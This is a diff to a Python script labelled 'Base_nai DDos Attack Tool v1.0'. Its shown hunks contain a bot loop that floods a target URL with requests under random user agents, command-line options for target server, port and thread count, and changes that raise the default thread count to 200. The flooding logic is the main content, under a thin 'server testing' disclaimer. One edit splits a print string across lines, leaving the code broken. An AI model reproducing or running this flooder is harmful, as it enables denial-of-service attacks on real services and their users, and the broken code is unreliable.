@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/python
 # -*- coding: utf-8 -*-
 
 
@@ -35,13 +35,11 @@ def my_bots():
 
 
 def bot_Base_nai(url):
-    print("Base_nai")
-
-    
     try:
         while True:
             req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(useragent)}))
-            print("\033[94mbot is Base_nai...\033[0m")
+            print("\033[94mbot is Base_nai.
+            ..\033[0m")
             time.sleep(.1)
     except:
         time.sleep(.1)
@@ -83,14 +81,14 @@ def dos2():
 
 
 def usage():
-    print(''' \033[92m	Base_nai Ddos Attack Tool v1.0
+    print(''' \033[92m	Base_nai DDos Attack Tool v1.0
     It is the end user's responsibility to obey all applicable laws.
     It is just for server testing script. Your ip is visible. \n
     usage : python Base_nai.py [-s] [-p] [-t]
     -h : help
     -s : server ip
-    -p : port default 80
-    -t : turbo default 135 \033[0m''')
+    -p : port default 8080
+    -t : turbo default 200 \033[0m''')
     sys.exit()
 
 
@@ -99,7 +97,7 @@ def get_parameters():
     global port
     global thr
     global item
-    optp = OptionParser(add_help_option=False, epilog="basmi")
+    optp = OptionParser(add_help_option=False, epilog="Base_nai")
     optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel",
                     const=logging.ERROR, default=logging.INFO)
     optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
@@ -115,11 +113,11 @@ def get_parameters():
     else:
         usage()
     if opts.port is None:
-        port = 80
+        port = 8080
     else:
         port = opts.port
     if opts.turbo is None:
-        thr = 135
+        thr = 200
     else:
         thr = opts.turbo
 
@@ -138,7 +136,7 @@ if __name__ == '__main__':
         usage()
     get_parameters()
     print("\033[92m", host, " port: ", str(port), " turbo: ", str(thr), "\033[0m")
-    print("\033[94mMohon tunggu...\033[0m")
+    print("\033[94mMohon tunggu sistem bekerja...\033[0m")
     user_agent()
     my_bots()
     time.sleep(5)
